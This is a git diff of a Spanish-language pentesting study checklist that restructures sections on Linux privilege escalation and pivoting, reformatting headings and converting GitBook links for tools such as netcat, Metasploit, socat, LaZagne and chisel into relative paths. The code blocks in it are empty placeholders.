 ☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️
 
-
-
 <details>
 
 <summary>🐧 ESCALADA DE PRIVILEGIOS LINUX ❌</summary>
 
-### ESCALADA DE PRIVILEGIOS LINUX
+#### ESCALADA DE PRIVILEGIOS LINUX
 
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
+*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
+*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)
+*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)
+*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)
+*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] LaZagne👈 --------------------------------->[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/47/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/lazagne-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows-y-linux)
+*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)
+
+    ```python
+    # Espacio para fragmento de código Python -->
+    ```
+
+    * CONCLUSION:
+*   [ ] LaZagne👈 --------------------------------->[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/lazagne-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows-y-linux.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -2517,15 +2494,13 @@
 
 ☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️
 
-
-
 <details>
 
 <summary>♻️ PIVOTING ❌</summary>
 
-### PIVOTING
+#### PIVOTING
 
-*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)
+*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -2539,7 +2514,7 @@
     ```
 
     * CONCLUSION:
-*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)
+*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -2553,7 +2528,7 @@
     ```
 
     * CONCLUSION:
-*   [ ] CHISEL👈 --------------------------------->[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/chisel-creacion-de-tunel-entre-servidores-local-y-remoto-tambien-para-aprovechar-pivoting)
+*   [ ] CHISEL👈 --------------------------------->[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/chisel-creacion-de-tunel-entre-servidores-local-y-remoto-tambien-para-aprovechar-pivoting.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -2617,8 +2592,3 @@
 </details>
 
 💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀
-
-
-
-
-
